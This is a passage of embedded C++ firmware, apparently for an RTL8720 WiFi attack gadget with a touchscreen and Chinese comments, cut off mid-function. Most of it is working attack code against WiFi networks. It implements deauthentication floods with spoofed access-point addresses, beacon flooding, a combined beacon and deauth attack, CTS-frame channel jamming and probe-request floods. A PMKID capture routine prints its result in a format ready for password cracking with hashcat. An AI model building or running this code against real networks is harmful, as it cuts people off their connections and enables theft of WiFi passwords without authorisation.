  tft.fillRect(ECG_GRID_X + 1, ECG_GRID_Y + 1, ECG_GRID_W - 2, ECG_GRID_H - 2, COLOR_BG);

  // 重绘内部网格（i=1..3，跳过 i=0 和 i=4 以免覆盖顶部/底部边框）
  uint16_t gridColor = 0x1926;
  for (int i = 1; i <= 3; i++) {
    int gy = ECG_GRID_Y + (ECG_GRID_H * i) / 4;
    if (i == 2) {
      tft.drawLine(ECG_GRID_X + 1, gy, ECG_GRID_X + ECG_GRID_W - 2, gy, 0x2C6A);  // 中线
    } else {
      for (int x = ECG_GRID_X + 1; x < ECG_GRID_X + ECG_GRID_W - 1; x += 4) {
        tft.drawPixel(x, gy, gridColor);
        tft.drawPixel(x + 1, gy, gridColor);
      }
    }
  }

  // 绘制波形（点数超过屏幕宽度时压缩采样）
  int startIdx = (g_ecgCount > ECG_BUF_SIZE) ? (g_ecgHead - ECG_BUF_SIZE) : 0;
  int drawCount = (count > ECG_GRID_W) ? ECG_GRID_W : count;
  int step = (count > ECG_GRID_W) ? (count / ECG_GRID_W) : 1;

  for (int i = 1; i < drawCount; i++) {
    int i0 = startIdx + (i - 1) * step;
    int i1 = startIdx + i * step;
    if (i0 < 0) i0 += ECG_BUF_SIZE;
    if (i1 < 0) i1 += ECG_BUF_SIZE;
    int idx0 = (i0 + ECG_BUF_SIZE) % ECG_BUF_SIZE;
    int idx1 = (i1 + ECG_BUF_SIZE) % ECG_BUF_SIZE;

    int v0 = g_ecgBuf[idx0];
    int v1 = g_ecgBuf[idx1];
    // 波形居中到中线上振荡（振幅减半，中线Y=100，半幅=21）
    int midY  = ECG_GRID_Y + ECG_GRID_H / 2;   // 100
    int halfA = ECG_GRID_H / 4;                // 21
    int y0 = midY + halfA - v0 / 2;
    int y1 = midY + halfA - v1 / 2;
    // 钳位到中线±半幅范围（y=79~121）
    if (y0 < midY - halfA) y0 = midY - halfA;
    if (y1 < midY - halfA) y1 = midY - halfA;
    if (y0 > midY + halfA) y0 = midY + halfA;
    if (y1 > midY + halfA) y1 = midY + halfA;

    int x0 = ECG_GRID_X + i - 1;
    int x1 = ECG_GRID_X + i;

    // 绿色波形线（宽度2px加粗）
    tft.drawLine(x0, y0, x1, y1, 0x07E0);
    if (i > 0 && abs(y1 - y0) < 3) {
      tft.drawPixel(x0, y0 - 1, 0x05C0);  // 抗锯齿/加粗
    }
  }

  // 前导闪烁光点（心电图机扫描线效果）
  if (drawCount > 1) {
    int lastIdx = (startIdx + drawCount - 1 + ECG_BUF_SIZE) % ECG_BUF_SIZE;
    int lastVal = g_ecgBuf[lastIdx];
    int midY  = ECG_GRID_Y + ECG_GRID_H / 2;   // 100
    int halfA = ECG_GRID_H / 4;                // 21
    int lastY = midY + halfA - lastVal / 2;
    if (lastY < midY - halfA) lastY = midY - halfA;
    if (lastY > midY + halfA) lastY = midY + halfA;
    int lastX = ECG_GRID_X + drawCount - 1;
    if (lastX < ECG_GRID_X + ECG_GRID_W) {
      tft.fillCircle(lastX, lastY, 2, 0x07E0);  // 绿色光点
      tft.drawPixel(lastX, lastY, 0xFFFF);       // 白色中心
    }
  }
}

// 更新 ECG：传入当前总包数，自动计算PPS并刷新波形
static void updateECG(unsigned long totalPackets) {
  unsigned long now = millis();
  g_ecgTotalPkts = totalPackets;

  // 每 ~200ms 计算一次 PPS
  if (now - g_ecgLastPPSms >= 200) {
    unsigned long dt = now - g_ecgLastPPSms;
    if (dt > 0) {
      g_ecgCurPPS = (int)((totalPackets - g_ecgLastPkts) * 1000UL / dt);
    }
    g_ecgLastPkts = totalPackets;
    g_ecgLastPPSms = now;

    // 自适应Y轴上限
    if (g_ecgCurPPS > g_ecgMaxVal) {
      g_ecgMaxVal = g_ecgCurPPS + 20;
      if (g_ecgMaxVal < 60) g_ecgMaxVal = 60;
    }

    // 将PPS映射到0~ECG_GRID_H波形值
    int waveVal = (int)((unsigned long)g_ecgCurPPS * ECG_GRID_H / g_ecgMaxVal);
    if (waveVal > ECG_GRID_H) waveVal = ECG_GRID_H;
    if (waveVal < 1 && g_ecgCurPPS > 0) waveVal = 2;  // 微小幅仍可见

    // 写入环形缓冲区
    g_ecgBuf[g_ecgHead] = waveVal;
    g_ecgHead = (g_ecgHead + 1) % ECG_BUF_SIZE;
    if (g_ecgCount < ECG_BUF_SIZE * 2) g_ecgCount++;
  }

  // 每 ~250ms 重绘一次波形 + 状态行（降低刷新频率防止WDT触发）
  if (now - g_ecgLastDraw >= 250) {
    g_ecgLastDraw = now;

    // 消隐旧文字区
    tft.fillRect(0, 44, SCREEN_WIDTH, 14, COLOR_BG);        // 状态行
    tft.fillRect(ECG_GRID_X, ECG_GRID_Y + ECG_GRID_H + 2, ECG_GRID_W, 14, COLOR_BG); // 统计行

    // === 状态行：运行时间 + 总包数 ===
    unsigned long elapsedSec = (now - g_ecgAttackStart) / 1000;
    char statusLine[48];
    snprintf(statusLine, sizeof(statusLine), "运行 %02lu:%02lu | 包 %lu",
             elapsedSec / 60, elapsedSec % 60, totalPackets);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);  // 青色
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int sw = u8g2_for_adafruit_gfx.getUTF8Width(statusLine);
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - sw) / 2, 55);
    u8g2_for_adafruit_gfx.print(statusLine);

    // === 统计行：实时速率 ===
    char rateLine[64];
    snprintf(rateLine, sizeof(rateLine), "实时速率: %d pps  (峰值 %d)", g_ecgCurPPS, g_ecgMaxVal - 20);
    u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);  // 黄色
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(ECG_GRID_X + 4, ECG_GRID_Y + ECG_GRID_H + 12);
    u8g2_for_adafruit_gfx.print(rateLine);

    // === 重绘波形 ===
    drawECGWaveform();
  }
}

// ==================== 攻击运行界面 ====================
#define STOP_BTN_Y  220
#define STOP_BTN_H  36
#define STOP_BTN_X  40
#define STOP_BTN_W  (SCREEN_WIDTH - 80)

void drawAttackRunningUI(const char* title) {
  tft.fillScreen(COLOR_BG);

  // 标题栏 - 红色运行指示
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, 0xF800);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0xF800);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width(title);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print(title);

  // 初始化 ECG 并绘制框架
  initECG(title);
  drawECGFrame();

  // 停止按钮 (缩小，让位给ECG)
  tft.fillRoundRect(STOP_BTN_X, STOP_BTN_Y, STOP_BTN_W, STOP_BTN_H, 8, COLOR_BTN_BACK);
  tft.drawRoundRect(STOP_BTN_X, STOP_BTN_Y, STOP_BTN_W, STOP_BTN_H, 8, COLOR_WHITE);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_BACK);
  tw = u8g2_for_adafruit_gfx.getUTF8Width("停止攻击");
  u8g2_for_adafruit_gfx.setCursor(STOP_BTN_X + (STOP_BTN_W - tw) / 2, STOP_BTN_Y + STOP_BTN_H / 2 + 6);
  u8g2_for_adafruit_gfx.print("停止攻击");
}

// 攻击循环内调用：检测停止按钮触摸
// 覆盖攻击界面(220~256)和检测界面(258~294)两种按钮位置
void checkAttackStop() {
  int16_t tx, ty;
  if (!touch_read(&tx, &ty)) return;
  if (tx >= STOP_BTN_X && tx <= STOP_BTN_X + STOP_BTN_W &&
      ty >= STOP_BTN_Y && ty <= 294) {
    g_attackStop = true;
    Serial.println("[停止] 用户触发了停止按钮!");
  }
}

// ==================== 攻击执行函数 ====================
void attackDeauth() {
  // 收集选中的目标
  std::vector<int> targets;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) targets.push_back((int)i);
  }
  if (targets.empty()) {
    Serial.println("[Deauth] 没有选中的目标!");
    return;
  }

  Serial.print("[Deauth] 开始解除认证攻击, 目标数: ");
  Serial.println(targets.size());

  // 绘制攻击运行界面 + 停止按钮
  g_attackStop = false;
  g_attackRunningType = 0;
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("解除认证攻击");

  unsigned long startMs = millis();
  int packetCount = 0;

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    delay(1);  // 喂狗，防止WDT复位
    unsigned long now = millis();
    if (now - startMs >= 2000) {
      startMs = now;
      updateECG(packetCount);
      Serial.print("[Deauth] 已发送 ");
      Serial.print(packetCount);
      Serial.println(" 帧...");
    }

    // 遍历所有目标
    for (int idx : targets) {
      if (g_attackStop) break;
      if (idx < 0 || (size_t)idx >= scan_results.size()) continue;

      // 切换到目标信道
      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

      DeauthFrame frame;
      memcpy(frame.source, scan_results[idx].bssid, 6);
      memcpy(frame.access_point, scan_results[idx].bssid, 6);
      memcpy(frame.destination, BROADCAST_MAC, 6);

      // 按3个原因码各发一批
      for (int r = 0; r < DEAUTH_REASON_COUNT; r++) {
        if (g_attackStop) break;
        frame.reason = DEAUTH_REASONS[r];
        for (int b = 0; b < 5; b++) {  // 每个原因码发5帧
          wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
          packetCount++;
        }
      }
      }
  }

  // 停止后返回主菜单
  Serial.println("[Deauth] 攻击已停止");
  g_touchValid = false;        // 清除残留触摸去抖状态
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

void attackBeacon() {
  // 收集选中的目标（获取SSID）
  std::vector<int> targets;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) targets.push_back((int)i);
  }
  if (targets.empty()) {
    Serial.println("[Beacon] 没有选中的目标!");
    return;
  }

  Serial.print("[Beacon] 开始信标帧泛洪, 目标数: ");
  Serial.println(targets.size());

  g_attackStop = false;
  g_attackRunningType = 1;
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("信标帧泛洪攻击");

  int roundCount = 0;

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    delay(1);  // 喂狗
    roundCount++;

    // 遍历所有目标
    for (int idx : targets) {
      if (g_attackStop) break;
      if (idx < 0 || (size_t)idx >= scan_results.size()) continue;

      const char *ssid = scan_results[idx].ssid.c_str();
      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

      // 6个克隆MAC × 每MAC发10帧 = 60帧/目标
      const int cloneCount = 6;
      for (int c = 0; c < cloneCount; c++) {
        if (g_attackStop) break;
        uint8_t fakeMac[6];
        generateRandomMAC(fakeMac);
        for (int x = 0; x < 10; x++) {
          wifi_tx_beacon_frame(fakeMac, (void *)BROADCAST_MAC, ssid);
        }
      }
      }

    // 每5轮更新 ECG + 统计（预估包数 = 轮×目标×60帧）
    if (roundCount % 5 == 0) {
      unsigned long estPkts = (unsigned long)roundCount * targets.size() * 60UL;
      updateECG(estPkts);
      Serial.print("[Beacon] 已完成 ");
      Serial.print(roundCount);
      Serial.println(" 轮发送");
    }
  }

  Serial.println("[Beacon] 攻击已停止");
  g_touchValid = false;        // 清除残留触摸去抖状态
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

void attackBeaconDeauth() {
  // 收集选中的目标
  std::vector<int> targets;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) targets.push_back((int)i);
  }
  if (targets.empty()) {
    Serial.println("[Beacon+Deauth] 没有选中的目标!");
    return;
  }

  Serial.print("[Beacon+Deauth] 开始组合攻击, 目标数: ");
  Serial.println(targets.size());

  g_attackStop = false;
  g_attackRunningType = 2;
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("信标+解除认证组合");

  int deauthCount = 0;
  int beaconRound = 0;

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    delay(1);  // 喂狗
    beaconRound++;

    // 遍历所有目标
    for (int idx : targets) {
      if (g_attackStop) break;
      if (idx < 0 || (size_t)idx >= scan_results.size()) continue;

      const char *ssid = scan_results[idx].ssid.c_str();
      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

      // === 信标帧泛洪 ===
      const int cloneCount = 3;  // 组合攻击时减半避免过载
      for (int c = 0; c < cloneCount; c++) {
        if (g_attackStop) break;
        uint8_t fakeMac[6];
        generateRandomMAC(fakeMac);
        for (int x = 0; x < 5; x++) {
          wifi_tx_beacon_frame(fakeMac, (void *)BROADCAST_MAC, ssid);
        }
      }

      // === 解除认证帧 ===
      DeauthFrame frame;
      memcpy(frame.source, scan_results[idx].bssid, 6);
      memcpy(frame.access_point, scan_results[idx].bssid, 6);

      // 双向攻击: AP→Client + Client→AP
      for (int r = 0; r < DEAUTH_REASON_COUNT; r++) {
        if (g_attackStop) break;
        frame.reason = DEAUTH_REASONS[r];

        // AP → Broadcast
        memcpy(frame.destination, BROADCAST_MAC, 6);
        for (int b = 0; b < 3; b++) {
          wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
          deauthCount++;
        }

        // Broadcast → AP
        memcpy(frame.source, BROADCAST_MAC, 6);
        memcpy(frame.destination, scan_results[idx].bssid, 6);
        for (int b = 0; b < 3; b++) {
          wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
          deauthCount++;
        }

        // 恢复 source
        memcpy(frame.source, scan_results[idx].bssid, 6);
      }
      }

    // 每5轮更新 ECG + 统计
    if (beaconRound % 5 == 0) {
      updateECG(deauthCount);
      Serial.print("[Beacon+Deauth] 信标轮次: ");
      Serial.print(beaconRound);
      Serial.print(", Deauth帧: ");
      Serial.println(deauthCount);
    }
  }

  Serial.println("[Beacon+Deauth] 攻击已停止");
  g_touchValid = false;        // 清除残留触摸去抖状态
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== 信道干扰攻击 ====================
void attackChannelJam() {
  // 收集选中目标的信道，去重
  std::set<int> chSet;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) {
      chSet.insert((int)scan_results[i].channel);
    }
  }
  if (chSet.empty()) {
    Serial.println("[信道干扰] 没有选中的目标! 请先在WiFi列表中选择目标。");
    return;
  }

  std::vector<int> channels;
  for (int ch : chSet) channels.push_back(ch);

  Serial.print("[信道干扰] 开始干扰 ");
  Serial.print(channels.size());
  Serial.print(" 个信道: ");
  for (size_t i = 0; i < channels.size(); i++) {
    Serial.print(channels[i]);
    if (i < channels.size() - 1) Serial.print(", ");
  }
  Serial.println();

  // 绘制攻击运行界面
  g_attackStop = false;
  g_attackRunningType = 3;  // 3 = 信道干扰
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("信道干扰攻击");

  int cycleCount = 0;
  int frameCount = 0;

  // 构建CTS帧模板
  CtsFrame cts;
  cts.frame_ctrl = 0x00C4;           // CTS控制帧类型
  cts.duration   = 32767;            // 最大信道占用时间 (~32ms)
  memcpy(cts.ra, BROADCAST_MAC, 6);  // 广播地址

  size_t chIdx = 0;
  const int FRAMES_PER_CHANNEL = 50; // 每信道每轮发送50帧

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    delay(1);  // 喂狗

    int ch = channels[chIdx];
    wext_set_channel(WLAN0_NAME, ch);

    // 在目标信道快速连续发送CTS帧
    for (int f = 0; f < FRAMES_PER_CHANNEL; f++) {
      if (g_attackStop) break;
      wifi_tx_raw_frame(&cts, sizeof(CtsFrame));
      frameCount++;
      delayMicroseconds(500);  // 帧间隔仅0.5ms，最大化信道占用
    }

    // 切换到下一个信道
    chIdx = (chIdx + 1) % channels.size();
    cycleCount++;

    // 每50轮更新 ECG + 统计
    if (cycleCount % 50 == 0) {
      updateECG(frameCount);
      Serial.print("[信道干扰] 轮次: ");
      Serial.print(cycleCount);
      Serial.print(", 总帧数: ");
      Serial.print(frameCount);
      Serial.print(", 当前信道: ");
      Serial.println(ch);
    }
  }

  // 停止后返回主菜单
  Serial.println("[信道干扰] 攻击已停止");
  Serial.print("  共发送帧数: ");
  Serial.println(frameCount);
  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== 洪水攻击 (Probe Request Flood) ====================
// 构建探测请求帧到缓冲区，返回帧长度
// Probe Request 802.11 管理帧: 24字节头 + SSID IE (2+n)
static int buildProbeRequest(uint8_t *buf, const char *ssid, int ssidLen) {
  // Frame Control: 0x0040 = Management, Probe Request
  buf[0] = 0x40;  buf[1] = 0x00;
  // Duration: 0
  buf[2] = 0x00;  buf[3] = 0x00;
  // DA: Broadcast
  memcpy(buf + 4, BROADCAST_MAC, 6);
  // SA: Random MAC
  uint8_t randMac[6];
  generateRandomMAC(randMac);
  memcpy(buf + 10, randMac, 6);
  // BSSID: Broadcast
  memcpy(buf + 16, BROADCAST_MAC, 6);
  // Sequence Control: random
  buf[22] = (uint8_t)random(0, 256);
  buf[23] = (uint8_t)random(0, 16);

  // SSID IE: Tag 0
  buf[24] = 0x00;           // Tag Number = SSID
  buf[25] = (uint8_t)ssidLen; // Tag Length
  // 有SSID则填入，否则发零长度（通配符）
  if (ssidLen > 0 && ssid != nullptr) {
    memcpy(buf + 26, ssid, ssidLen);
  }

  return 26 + ssidLen;  // 24 header + 2 IE header + SSID
}

void attackProbeFlood() {
  // 收集选中目标的 SSID 列表
  std::vector<String> targetSSIDs;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i] && scan_results[i].ssid.length() > 0) {
      targetSSIDs.push_back(scan_results[i].ssid);
    }
  }

  // 无选中目标时使用通配符 (零长度SSID) 泛洪
  if (targetSSIDs.empty()) {
    Serial.println("[洪水攻击] 没有选中目标，使用通配符SSID泛洪全信道");
  } else {
    Serial.print("[洪水攻击] 开始探测请求泛洪, 目标SSID数: ");
    Serial.println(targetSSIDs.size());
  }

  // 收集目标信道，未选目标时覆盖全2.4G
  std::set<int> chSet;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) chSet.insert((int)scan_results[i].channel);
  }
  if (chSet.empty()) {
    for (int i = 0; i < ALL_CH_COUNT; i++) chSet.insert(ALL_CH_LIST[i]);
  }
  std::vector<int> channels;
  for (int ch : chSet) channels.push_back(ch);

  // 绘制攻击运行界面
  g_attackStop = false;
  g_attackRunningType = 4;  // 4 = 洪水攻击
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("洪水攻击");

  int frameCount = 0;
  int cycleCount = 0;
  size_t chIdx = 0;
  size_t ssidIdx = 0;
  const int FRAMES_PER_CH = 30;  // 每信道每轮发送帧数

  uint8_t frameBuf[64];  // 探测请求帧缓冲区

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    delay(1);  // 喂狗

    int ch = channels[chIdx];
    wext_set_channel(WLAN0_NAME, ch);

    for (int f = 0; f < FRAMES_PER_CH; f++) {
      if (g_attackStop) break;

      // 构建探测请求帧
      int frameLen;
      if (targetSSIDs.empty()) {
        // 通配符SSID — 轮换零长度/随机短SSID
        static const char* wildSSIDs[] = {"", "a", "test", "wifi", "admin"};
        int wi = frameCount % 5;
        const char* ws = wildSSIDs[wi];
        frameLen = buildProbeRequest(frameBuf, ws, strlen(ws));
      } else {
        // 使用目标SSID轮换
        const String& ssid = targetSSIDs[ssidIdx];
        ssidIdx = (ssidIdx + 1) % targetSSIDs.size();
        frameLen = buildProbeRequest(frameBuf, ssid.c_str(), ssid.length());
      }

      wifi_tx_raw_frame(frameBuf, frameLen);
      frameCount++;
      delayMicroseconds(300);  // 高密度发送
    }

    // 切换信道
    chIdx = (chIdx + 1) % channels.size();
    cycleCount++;

    if (cycleCount % 100 == 0) {
      updateECG(frameCount);
      Serial.print("[洪水] 轮次: ");
      Serial.print(cycleCount);
      Serial.print(", 帧数: ");
      Serial.print(frameCount);
      Serial.print(", 信道: ");
      Serial.println(ch);
    }
  }

  Serial.println("[洪水攻击] 已停止");
  Serial.print("  共发送探测帧: ");
  Serial.println(frameCount);
  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== PMKID 捕获攻击 ====================
// 向目标AP发送关联请求，捕获EAPOL帧中的PMKID（无需客户端在线）
static uint8_t g_pmkidBssid[6];
static bool g_pmkidCaptured = false;
static uint8_t g_pmkidHash[16];  // PMKID = HMAC-SHA1(PMK, "PMK Name" + AP_MAC + STA_MAC)

void attackPMKID() {
  // 1. 检查选中目标
  std::vector<int> targets;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) targets.push_back((int)i);
  }
  if (targets.empty()) {
    Serial.println("[PMKID] 请先在WiFi列表中勾选目标AP!");
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("请先勾选目标AP!");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
    u8g2_for_adafruit_gfx.print("请先勾选目标AP!");
    delay(1500);
    g_screen = SCREEN_MAIN; currentSelection = 1; g_pendingMenuDraw = true;
    return;
  }

  const WiFiScanResult& tgt = scan_results[targets[0]];
  memcpy(g_pmkidBssid, tgt.bssid, 6);
  g_pmkidCaptured = false;
  memset(g_pmkidHash, 0, sizeof(g_pmkidHash));

  // ★ 必须设置 _selectedNetwork，否则嗅探回调会过滤掉目标AP的 EAPOL 帧
  memcpy(_selectedNetwork.bssid, tgt.bssid, 6);
  _selectedNetwork.ssid = tgt.ssid;
  _selectedNetwork.ch = tgt.channel;
  AP_Channel = String(tgt.channel);

  Serial.print("[PMKID] 目标: "); Serial.print(tgt.ssid);
  Serial.print(" CH"); Serial.println(tgt.channel);

  g_attackStop = false;
  g_attackRunningType = 9;
  g_screen = SCREEN_ATTACK_RUNNING;
  drawAttackRunningUI("PMKID密钥捕获");

  // 2. 清空旧握手数据 + 设置信道
  resetCaptureData();
  resetGlobalHandshakeData();
  wext_set_channel(WLAN0_NAME, tgt.channel);
  WiFi.disablePowerSave();
  wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
  delay(100);

  // 3. 生成临时STA MAC并发送关联请求
  uint8_t staMac[6];
  generateRandomMAC(staMac);

  Serial.print("[PMKID] 发送关联请求, STA=");
  for (int i = 0; i < 6; i++) { Serial.print(staMac[i], HEX); if (i<5) Serial.print(":"); }
  Serial.println();

  wifi_tx_auth_req(staMac, g_pmkidBssid);
  delay(20);

  // 构建关联请求（含SSID IE）
  AssocReqFrame assoc;
  memcpy(assoc.source, staMac, 6);
  memcpy(assoc.destination, g_pmkidBssid, 6);
  memcpy(assoc.bssid, g_pmkidBssid, 6);
  assoc.ssid_length = tgt.ssid.length() > 31 ? 31 : tgt.ssid.length();
  memcpy(assoc.ssid, tgt.ssid.c_str(), assoc.ssid_length);
  wifi_tx_raw_frame(&assoc, sizeof(AssocReqFrame));
  delay(50);

  // 4. 启用混杂模式捕获EAPOL
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  delay(100);

  // 5. 等待PMKID（最大15秒）
  Serial.println("[PMKID] 监听EAPOL帧，等待PMKID...");
  unsigned long startMs = millis();
  const unsigned long timeoutMs = 15000;
  bool foundPMKID = false;

  while (millis() - startMs < timeoutMs) {
    checkAttackStop();
    if (g_attackStop) break;

    // 检查已捕获的握手帧中是否有PMKID
    for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
      HandshakeFrame& hf = capturedHandshake.frames[i];
      if (hf.length < 50) continue;

      ParsedEapolInfo info;
      if (!parseEapol(hf.data, hf.length, info))
        if (!parseEapolFromEthertype(hf.data, hf.length, info)) continue;

      // PMKID存在于M1帧（AP→STA, descriptor=2, ACK set, no MIC, no Install）
      // Key Data字段包含 PMKID KDE (Type=0xDD, OUI=00:0F:AC, Type=4)
      bool isM1 = info.isFromAP && info.descriptorType == 0x02 &&
                  info.hasAck && !info.hasMic && !info.hasInstall;
      if (!isM1) continue;

      // 搜索PMKID KDE: DD (type) + len + 00:0F:AC:04 + 16字节PMKID
      unsigned int off = findEAPOLPayloadOffset(hf.data, hf.length);
      if (off == 0) continue;
      off += 8;  // 跳过LLC SNAP头
      // EAPOL header: ver(1)+type(1)+len(2) = 4
      // Key descriptor: type(1)+keyInfo(2)+keyLen(2)+replay(8)+nonce(32)+iv(16)+rsc(8)+id(8)+mic(16)+keyDataLen(2)
      unsigned int eapolOff = off + 4;
      if (eapolOff + 95 > hf.length) continue;
      // keyDataLen at offset 95 from eapol start
      uint16_t keyDataLen = ((uint16_t)hf.data[eapolOff + 95] << 8) | hf.data[eapolOff + 96];
      unsigned int kdeOff = eapolOff + 97;  // start of Key Data (KDEs)
      unsigned int kdeEnd = kdeOff + keyDataLen;

      for (unsigned int k = kdeOff; k + 2 < kdeEnd && k < hf.length; ) {
        uint8_t tagType = hf.data[k];
        uint8_t tagLen = hf.data[k + 1];
        if (k + 2 + tagLen > hf.length) break;

        // PMKID KDE: Type=0xDD, OUI=00:0F:AC:04
        if (tagType == 0xDD && tagLen >= 19 &&
            hf.data[k + 2] == 0x00 && hf.data[k + 3] == 0x0F &&
            hf.data[k + 4] == 0xAC && hf.data[k + 5] == 0x04) {
          memcpy(g_pmkidHash, &hf.data[k + 6], 16);
          foundPMKID = true;
          break;
        }
        k += 2 + tagLen;
      }
      if (foundPMKID) break;
    }

    // 每2秒重发关联请求
    if (!foundPMKID && (millis() - startMs) % 2000 < 10) {
      wifi_tx_auth_req(staMac, g_pmkidBssid);
      delay(10);
      assoc.ssid_length = tgt.ssid.length() > 31 ? 31 : tgt.ssid.length();
      memcpy(assoc.ssid, tgt.ssid.c_str(), assoc.ssid_length);
      wifi_tx_raw_frame(&assoc, sizeof(AssocReqFrame));
    }

    if (foundPMKID) break;
    delay(50);
  }

  // 6. 清理
  wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
  delay(100);

  if (foundPMKID) {
    g_pmkidCaptured = true;
    Serial.println("[PMKID] ★ 成功捕获PMKID! ★");
    Serial.print("[PMKID] Hash: ");
    for (int i = 0; i < 16; i++) {
      if (g_pmkidHash[i] < 0x10) Serial.print("0");
      Serial.print(g_pmkidHash[i], HEX);
    }
    Serial.println();
    Serial.println("[PMKID] 请用 hashcat -m 22000 破解");
    Serial.print("[PMKID] WPA*01*PMKID*");
    for (int i = 0; i < 6; i++) {
      if (g_pmkidBssid[i] < 0x10) Serial.print("0");
      Serial.print(g_pmkidBssid[i], HEX);
    }
    Serial.print("*");
    for (int i = 0; i < 6; i++) {
      if (staMac[i] < 0x10) Serial.print("0");
      Serial.print(staMac[i], HEX);
    }
    Serial.println();

    // 显示结果
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("PMKID捕获成功!");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 120);
    u8g2_for_adafruit_gfx.print("PMKID捕获成功!");
    u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
    u8g2_for_adafruit_gfx.setCursor(10, 155);
    u8g2_for_adafruit_gfx.print("Serial查看Hashcat格式");
    delay(3000);

    // 保存到文件
    // (可选: 写入SD卡或SPIFFS)
  } else {
    Serial.println("[PMKID] 未捕获到PMKID(AP可能不支持PMKID或已配置PMF)");
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("PMKID捕获失败");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
    u8g2_for_adafruit_gfx.print("PMKID捕获失败");
    delay(2000);
  }

  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== 认证/关联洪水攻击 ====================
void attackAuthFlood() {
  // 检查选中目标
  std::vector<int> targets;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (selectedFlags[i]) targets.push_back((int)i);
  }
  if (targets.empty()) {
    Serial.println("[AuthFlood] 请先勾选目标AP!");
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("请先勾选目标AP!");
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
    u8g2_for_adafruit_gfx.print("请先勾选目标AP!");
    delay(1500);
